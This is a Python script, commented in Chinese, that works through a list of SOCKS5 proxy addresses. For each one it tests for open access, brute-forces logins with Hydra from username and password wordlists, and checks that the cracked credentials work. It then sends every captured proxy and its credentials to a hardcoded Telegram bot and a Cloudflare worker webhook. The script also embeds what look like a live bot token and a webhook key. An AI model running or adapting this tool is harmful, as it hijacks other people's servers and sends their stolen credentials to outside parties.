import subprocess
import requests
import time
import socket
import socks
import re
import os
from datetime import datetime

# ================= 配置区域 =================
TG_BOT_TOKEN = "8517647551:AAEosyUg4hcmy1hy4mdiKoo-M9sg9ZqRSAY"
TG_CHAT_ID = "6977085303"
WEBHOOK_URL = "https://wepush.yhe8714.workers.dev/wxsend"
WEBHOOK_AUTH = "hy248624"

# 文件路径
SOCKS_FILE = "/root/s5/socks.txt"
USER_FILE = "/root/s5/users.txt"
PASS_FILE = "/root/s5/pass.txt"
LOG_FILE = "/root/s5/success_proxies.log"
STATUS_FILE = "/root/s5/monitor.status"

# 定时汇报间隔 (秒) - 6小时
HEARTBEAT_INTERVAL = 21600 
# ===========================================

def update_status(message):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{now}] {message}"
    print(full_msg)
    try:
        with open(STATUS_FILE, "w", encoding="utf-8") as f:
            f.write(full_msg)
    except:
        pass

def send_webhook(title, content):
    if not WEBHOOK_URL: return
    headers = {"Authorization": WEBHOOK_AUTH, "Content-Type": "application/json"}
    payload = {
        "title": title,
        "content": content,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        requests.post(WEBHOOK_URL, headers=headers, json=payload, timeout=10)
    except:
        pass

def send_telegram(message):
    if not TG_BOT_TOKEN or not TG_CHAT_ID: return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def send_periodic_report(current, total):
    """【修改】只发送纯粹的进度，不要预计时间"""
    percent = (current / total) * 100
    
    title = "📈 扫描进度汇报"
    # Webhook 简短内容
    content = f"当前进度: {current}/{total} ({percent:.2f}%)"
    
    # TG 详细内容
    tg_msg = (
        f"<b>【{title}】</b>\n"
        f"当前进度：<code>{current}</code> / <code>{total}</code>\n"
        f"完成比例：<code>{percent:.2f}%</code>"
    )
    
    update_status(f"⏰ 发送定时报告: {current}/{total}")
    send_telegram(tg_msg)
    send_webhook(title, content)

def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?lang=zh-CN"
        r = requests.get(url, timeout=5).json()
        if r['status'] == 'success':
            return {
                "country": r.get('country', '未知'),
                "region": r.get('regionName', ''),
                "city": r.get('city', ''),
                "isp": r.get('isp', '未知')
            }
    except:
        pass
    return {"country": "未知", "region": "", "city": "", "isp": "未知"}

def check_no_auth(ip, port, log_prefix=""):
    """探测无密模式"""
    update_status(f"{log_prefix} 探测无密模式: {ip}:{port} ...")
    origin_sock = socket.socket
    try:
        socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        socket.socket = socks.socksocket
        requests.get("http://www.microsoft.com", timeout=3)
        return True
    except:
        return False
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock

def verify_login(ip, port, user, password, log_prefix=""):
    """二次验证"""
    origin_sock = socket.socket
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
        s.settimeout(5)
        s.connect(("8.8.8.8", 53))
        s.close()
        return True
    except:
        return False
    finally:
        socket.socket = origin_sock

def test_proxy_speed(ip, port, user, password, log_prefix=""):
    update_status(f"{log_prefix} 正在测速: {ip}:{port} ...")
    origin_sock = socket.socket
    start = time.time()
    try:
        socks.set_default_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
        socket.socket = socks.socksocket
        
        requests.get("http://www.microsoft.com", timeout=5)
        latency = (time.time() - start) * 1000
        
        dl_start = time.time()
        requests.get("https://speed.cloudflare.com/__down?bytes=500000", timeout=10)
        speed = 500 / (time.time() - dl_start)
        return latency, speed
    except:
        return None, None
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock

def format_speed(s):
    if s is None: return "N/A"
    if s > 5000: return f"{s:.2f} kb/s(起飞)"
    if s > 2000: return f"{s:.2f} kb/s(极快)"
    if s > 500: return f"{s:.2f} kb/s(流畅)"
    return f"{s:.2f} kb/s(一般)"

def run_hydra(ip, port, log_prefix=""):
    update_status(f"{log_prefix} Hydra 正在爆破: {ip}:{port} ...")
    cmd = [
        "hydra", "-L", USER_FILE, "-P", PASS_FILE, "-s", port,
        "-t", "4", "-w", "1", "-f", "-I", f"socks5://{ip}"
    ]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True)
        match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", res.stdout)
        if match: return match.group(1), match.group(2), "Success"
        return None, None, "未找到"
    except Exception as e:
        return None, None, str(e)

def main():
    if not os.path.exists(SOCKS_FILE): return

    with open(SOCKS_FILE, 'r') as f:
        targets = [l.strip() for l in f if l.strip() and ":" in l]

    total = len(targets)
    update_status(f"任务启动: {total} 个目标")

    # 记录上次汇报时间 (初始化为任务开始时)
    last_report_time = time.time()

    for idx, target in enumerate(targets):
        # 检查是否需要发送定时报告
        if time.time() - last_report_time > HEARTBEAT_INTERVAL:
            send_periodic_report(idx, total)
            last_report_time = time.time()

        ip, port = target.split(":")
        current_num = idx + 1
        
        # 【修改】生成通用的进度前缀字符串，例如 "[1/500]"
        # 将这个前缀传给所有子函数，让它们打印出来
        progress_str = f"[{current_num}/{total}]"
        progress_percent = (current_num / total) * 100
        
        # 1. 无密检测 (带进度)
        is_no_auth = check_no_auth(ip, port, log_prefix=progress_str)
        user, pwd = (None, None)
        
        if not is_no_auth:
            # 2. Hydra 爆破 (带进度)
            user, pwd, reason = run_hydra(ip, port, log_prefix=progress_str)
        
        if is_no_auth or (user and pwd):
            if not is_no_auth:
                update_status(f"{progress_str} 正在二次验证: {user}:{pwd} ...")
                if not verify_login(ip, port, user, pwd):
                    update_status(f"⚠️ {progress_str} 丢弃: {ip}:{port} (Hydra误报)")
                    time.sleep(2)
                    continue
            
            show_u = user if user else "无"
            show_p = pwd if pwd else "无"
            
            # 测速 (带进度)
            lat, speed = test_proxy_speed(ip, port, user, pwd, log_prefix=progress_str)
            
            if lat is None:
                update_status(f"❌ {progress_str} 假死: {ip}:{port} [账号:{show_u} 密码:{show_p}]")
            else:
                info = get_ip_info(ip)
                
                if user:
                    link_full = f"socks5://{user}:{pwd}@{ip}:{port}"
                    tg_link_url = f"https://t.me/socks?server={ip}&port={port}&user={user}&pass={pwd}"
                else:
                    link_full = f"socks5://{ip}:{port}"
                    tg_link_url = f"https://t.me/socks?server={ip}&port={port}"
                
                lat_str = f"{lat:.2f} ms"
                speed_str = format_speed(speed)
                
                # 通知格式
                tg_msg = (
                    f"<b>【获取到socks5】</b>\n"
                    f"IP：<code>{ip}</code>\n"
                    f"端口：<code>{port}</code>\n"
                    f"账号：<code>{show_u}</code>\n"
                    f"密码：<code>{show_p}</code>\n\n"
                    f"<code>{link_full}</code>\n\n"
                    f"<a href='{tg_link_url}'>TG一键连接链接</a>\n"
                    f"延迟: {lat_str} | 下载速度: {speed_str}\n"
                    f"进度: {current_num}/{total} ({progress_percent:.1f}%)\n"
                    f"【归属地：{info['country']} {info['region']} {info['city']}】-【运营商：{info['isp']}】"
                )
                
                webhook_content = (
                    f"节点: {link_full}\n"
                    f"延迟: {lat_str} | 速度: {speed_str}\n"
                    f"进度: {current_num}/{total}"
                )
                
                with open(LOG_FILE, "a") as f: f.write(link_full + "\n")
                
                update_status(f"✅ {progress_str} 成功: {ip}:{port}")
                send_telegram(tg_msg)
                send_webhook(f"捕获SOCKS5: {ip}", webhook_content)
        else:
            update_status(f"⛔️ {progress_str} 失败: {ip}:{port}")

        # 冷却日志也带进度
        update_status(f"⏳ {progress_str} 冷却 2s...")
        time.sleep(2)

    # 任务全部结束
    send_periodic_report(total, total)
    update_status("所有任务已完成。")

if __name__ == "__main__":
    main()
